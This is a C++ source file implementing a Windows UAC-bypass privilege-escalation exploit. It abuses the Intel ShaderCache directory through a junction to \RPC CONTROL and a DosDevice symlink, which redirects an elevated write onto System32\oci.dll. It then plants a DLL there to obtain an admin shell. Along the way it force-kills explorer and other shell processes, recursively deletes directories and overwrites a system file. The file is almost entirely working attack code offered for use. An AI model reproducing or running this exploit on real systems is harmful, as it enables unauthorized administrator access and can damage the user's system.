#include <windows.h>
#include <iostream>
#include <filesystem>
#include <fstream>
#include <string>
#include <chrono>

#pragma comment(lib, "user32.lib")
#define REPARSE_DATA_BUFFER_HEADER_SIZE   FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer)

typedef struct _REPARSE_DATA_BUFFER {
    DWORD  ReparseTag;
    WORD   ReparseDataLength;
    WORD   Reserved;
    union {
        struct {
            WORD   SubstituteNameOffset;
            WORD   SubstituteNameLength;
            WORD   PrintNameOffset;
            WORD   PrintNameLength;
            DWORD  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            WORD   SubstituteNameOffset;
            WORD   SubstituteNameLength;
            WORD   PrintNameOffset;
            WORD   PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            BYTE   DataBuffer[1];
        } GenericReparseBuffer;
    };
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

std::wstring GetMostRecentFile(const std::wstring& directoryPath) {
    namespace fs = std::filesystem;

    std::wstring mostRecentFile;
    fs::file_time_type latestTime;

    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if (!entry.is_regular_file()) continue;

        auto ftime = entry.last_write_time();
        if (mostRecentFile.empty() || ftime > latestTime) {
            latestTime = ftime;
            mostRecentFile = entry.path().filename().wstring();
        }
    }

    return mostRecentFile;
}

void CreateJunction(LPCWSTR linkDir, LPCWSTR targetDir)
{
    HANDLE hFile;
    REPARSE_DATA_BUFFER* reparseData;
    DWORD bytesReturned;
    size_t targetLength;

    // Create the directory for the junction if it doesn't exist
    CreateDirectory(linkDir, NULL);

    // Open the directory
    hFile = CreateFile(linkDir, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open directory: " << GetLastError() << std::endl;
        return;
    }

    targetLength = wcslen(targetDir) * sizeof(WCHAR);
    reparseData = (REPARSE_DATA_BUFFER*)malloc(REPARSE_DATA_BUFFER_HEADER_SIZE + targetLength + 12);
    if (!reparseData) {
        std::cerr << "Failed to allocate memory." << std::endl;
        CloseHandle(hFile);
        return;
    }

    memset(reparseData, 0, REPARSE_DATA_BUFFER_HEADER_SIZE + targetLength + 12);
    reparseData->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    reparseData->ReparseDataLength = (USHORT)(targetLength + 12);
    reparseData->Reserved = 0;

    reparseData->MountPointReparseBuffer.SubstituteNameOffset = 0;
    reparseData->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetLength;
    reparseData->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetLength + sizeof(WCHAR));
    reparseData->MountPointReparseBuffer.PrintNameLength = 0;
    memcpy(reparseData->MountPointReparseBuffer.PathBuffer, targetDir, targetLength);

    // Set the reparse point
    if (!DeviceIoControl(hFile, FSCTL_SET_REPARSE_POINT, reparseData, REPARSE_DATA_BUFFER_HEADER_SIZE + reparseData->ReparseDataLength, NULL, 0, &bytesReturned, NULL)) {
        std::cerr << "Failed to set reparse point: " << GetLastError() << std::endl;
    }
    else {
        std::cout << "Junction created successfully." << std::endl;
    }

    free(reparseData);
    CloseHandle(hFile);
}

BOOL CreateDosDevice(LPCWSTR deviceName, LPCWSTR targetPath) {
    if (DefineDosDevice(DDD_RAW_TARGET_PATH, deviceName, targetPath)) {
        std::wcout << L"Created DosDevice: " << deviceName << L" -> " << targetPath << std::endl;
        return TRUE;
    }
    else {
        std::cerr << "Failed to create DosDevice: " << GetLastError() << std::endl;
        return FALSE;
    }
}

bool LaunchElevatedProcessWithTimeout(LPCWSTR executable, LPCWSTR parameters, DWORD timeout_ms)
{
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";  
    sei.lpFile = executable;
    sei.lpParameters = parameters;
    sei.nShow = SW_SHOWNORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExW(&sei))
    {
        DWORD err = GetLastError();
        std::wcerr << L"Failed to launch elevated process. Error: " << err << std::endl;
        return false;
    }

    if (sei.hProcess != NULL)
    {
        DWORD wait_result = WaitForSingleObject(sei.hProcess, timeout_ms);

        if (wait_result == WAIT_TIMEOUT)
        {
            std::wcout << L"Process exceeded timeout, terminating..." << std::endl;
            TerminateProcess(sei.hProcess, 1); 
        }
        else
        {
            std::wcout << L"Process exited within timeout." << std::endl;
        }

        CloseHandle(sei.hProcess);
    }

    return true;
}

void checkdir()
{
    std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";

    WinExec("cmd.exe /c TASKKILL /F /IM explorer.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM sihost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM ShellHost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM ApplicationFrameHost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
    
    std::wstring checkEmpty = GetMostRecentFile(dir);

    if (checkEmpty.empty()) {
        std::wcerr << L"Good news! No files found in the directory :)  Deleting directory and creating the junction!\n";
        WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
        Sleep(1000);
    }
    else {
        std::wcout << L"There are still files...continuing to kill tasks and delete stuff...Remaining file: " << checkEmpty << std::endl;
        Sleep(1000);
        checkdir();
    }
}

int wmain() {
    std::cout << "********************************\nIMPORTANT\n********************************\n";
    std::cout << "Before continuing, make sure ALL Desktop apps with a GUI are closed.  This includes browsers, notepad, discord, etc\n";
    std::cout << "The tool is only accounting for built in windows processes that have handles to files in the shadowcache directory\n";
    std::cout << "Press [ENTER] to continue...\n";
    std::cin.get();
    std::wstring recentFile, initialcheck;
    std::wstring dllTarget = L"\\??\\C:\\Windows\\System32\\oci.dll";

    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 

    std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";
    initialcheck = GetMostRecentFile(dir);

    if (initialcheck.empty()) {
        std::wcerr << L"Good news! No files found in the directory.\n";
    }
    else {
        std::wcout << L"Most recent file: " << initialcheck << std::endl;

        // Write to text file
        std::wofstream outFile(L"c:\\users\\public\\recent.txt");
        if (outFile) {
            outFile << initialcheck;
            outFile.close();
        }
        else {
            std::wcerr << L"Failed to write to recent.txt\n";
        }
    }
    WinExec("powershell.exe -ExecutionPolicy Bypass -File c:\\users\\robbi\\Desktop\\intel_uacbypass_prep.ps1", 0);

    Sleep(3000);

    WinExec("cmd.exe /c TASKKILL /F /IM explorer.exe", 0);
    Sleep(500);
    checkdir();

    // Create the junction
    CreateJunction(L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", L"\\??\\GLOBALROOT\\RPC CONTROL");

    std::wifstream inFile(L"c:\\users\\public\\recent.txt");

    if (inFile) {
        std::getline(inFile, recentFile); 
        inFile.close();

        std::wcout << L"Value read from file: " << recentFile << std::endl;
    }
    else {
        std::wcerr << L"Failed to open recent.txt\n";
    }

    std::wstring dosDeviceName = L"Global\\GLOBALROOT\\RPC CONTROL\\" + recentFile;

    if (CreateDosDevice(dosDeviceName.c_str(), dllTarget.c_str())) {
        std::wcout << L"Symlink created: " << dosDeviceName << L" -> " << dllTarget << std::endl;
        
    }
    else {
        std::wcerr << L"CreateDosDevice failed: " << GetLastError() << std::endl;
        return 1;
    }

    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 
   
    WinExec("cmd.exe /c copy /Y c:\\myfolder\\oci.dll c:\\windows\\system32\\oci.dll", 0); //overwrite dummy file with our file
    Sleep(3000);
    WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
    std::cout << "Launching admin shell!\n";
    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000); 
    std::cout << "[+] Cleanup: removing oci.dll to prevent unwanted issues with other exe's that want to load it\n";
    Sleep(1000);
    WinExec("cmd.exe /c del /F /Q C:\\Windows\\System32\\oci.dll", 0);
    return 0;
}